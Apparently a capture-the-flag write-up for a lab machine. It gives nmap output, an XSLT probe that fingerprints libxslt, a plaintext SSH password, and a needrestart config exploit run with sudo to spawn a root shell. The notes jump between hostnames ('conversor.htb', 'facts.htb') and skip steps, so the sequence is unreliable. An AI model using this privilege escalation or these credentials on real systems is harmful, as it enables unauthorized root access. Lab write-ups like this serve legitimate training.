## Recon
```bash
nmap -sC -sV -vv conversor.htb

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We see there is a login page and  a register account .
Once we log in we see the page is an xml converter
. Lets upload a test payload to see the tech behind
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <test>hello</test>
</root>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:value-of select="system-property('xsl:vendor-url')"/>
    <xsl:value-of select="system-property('xsl:version')"/>
  </xsl:template>
</xsl:stylesheet>
```
Upload those and we succefully get the lib used which is in this case libxslt (C).
![[Pasted image 20260224201314.png]]


	ssh fismathack@facts.htb
	password: Keepmesafeandwarm

```bash
 cat > /tmp/exploit.conf << 'EOF'
 BEGIN { system("/bin/bash -p") }
 %nrconf = (
     verbosity => 0,
     restart => 'a'
 );
 1;
 EOF
 sudo /usr/sbin/needrestart -c /tmp/exploit.conf

```
 